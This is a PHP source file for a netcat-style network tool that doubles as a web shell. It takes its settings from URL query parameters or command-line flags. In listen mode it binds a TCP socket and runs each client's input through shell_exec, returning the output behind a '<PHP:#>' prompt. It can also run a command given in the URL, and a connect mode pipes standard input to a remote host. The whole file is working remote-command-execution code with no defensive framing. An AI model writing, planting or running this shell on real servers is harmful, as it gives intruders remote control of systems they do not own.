<?php
$options = getopt(
  'a:p:t:q:e:c', [
      'listen-host:',
      'listen-port:',
      'target-host:',
      'target-port:',
      'execute:',
      'command-shell'
    ]
  );

$listenHost = '0.0.0.0';
$listenPort = 0;
$targetHost = '';
$targetPort = 0;
$fileToExecute = '';
$commandShell = false;

if (array_key_exists('listen-host', $_GET)) {
    $listenHost = $_GET['listen-host'];
} else if (array_key_exists('a', $options)) {
    $listenHost = $options['a'];
} else if (array_key_exists('listen-host', $options)) {
    $listenHost = $options['listen-host'];
}

if (array_key_exists('listen-port', $_GET)) {
    $listenPort = $_GET['listen-port'];
} else if (array_key_exists('p', $options)) {
    $listenPort = $options['p'];
} else if (array_key_exists('listen-port', $options)) {
    $listenPort = $options['listen-port'];
}

if (array_key_exists('target-host', $_GET)) {
    $targetHost = $_GET['target-host'];
} else if (array_key_exists('t', $options)) {
    $targetHost = $options['t'];
} else if (array_key_exists('target-host', $options)) {
    $targetHost = $options['target-host'];
}

if (array_key_exists('target-port', $_GET)) {
    $targetPort = $_GET['target-port'];
} else if (array_key_exists('q', $options)) {
    $targetPort = $options['q'];
} else if (array_key_exists('target-port', $options)) {
    $targetPort = $options['target-port'];
}

if (array_key_exists('execute', $_GET)) {
    $fileToExecute = $_GET['execute'];
} else if (array_key_exists('e', $options)) {
    $fileToExecute = $options['e'];
} else if (array_key_exists('execute', $options)) {
    $fileToExecute = $options['execute'];
}

if (array_key_exists('command-shell', $_GET)) {
    $commandShell = true;
} else if (array_key_exists('c', $options)) {
    $commandShell = true;
} else if (array_key_exists('command-shell', $options)) {
    $commandShell = true;
}

$startErrors = [];

if ($listenPort != 0 && $targetPort != 0) {
    $startErrors[] = "Listen and target ports cannot be set simultaneously.";
}

if ($listenPort != 0 && strlen($targetHost) != 0) {
    $startErrors[] = "Listen port and target host cannot be set simultaneously";
}

if (count($startErrors) > 0){
    echo join(' ', $startErrors);
    exit(1);
}

if ($listenPort != 0) {
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    socket_bind($socket, $listenHost, $listenPort) or die('Could not bind to address (is it in use?)');

    socket_listen($socket, 5);

    $client = socket_accept($socket);

    while (true){
        if (socket_last_error($client) == 32) {
            break;
        }

        if ($commandShell) {
            socket_write($client, '<PHP:#> ');
        }

        if ($fileToExecute) {
          socket_write($client, shell_exec($fileToExecute));
          break;
        }

        $buffer = '';

        while (true) {
            $input = socket_read($client, 4096);
            $buffer .= $input;
            if ($input < 4096) {
                break;
            }
        }

        if ($commandShell) {
            socket_write($client, shell_exec($buffer));
        } else {
            echo $buffer;
        }
    }
} else if ($targetPort) {
  $fp = fsockopen($targetHost, $targetPort, $errno, $errstr, 30);
  while (true) {
    while ($f = fgets(STDIN)) {
      fwrite($fp, $f);
    }
  }
}
?>
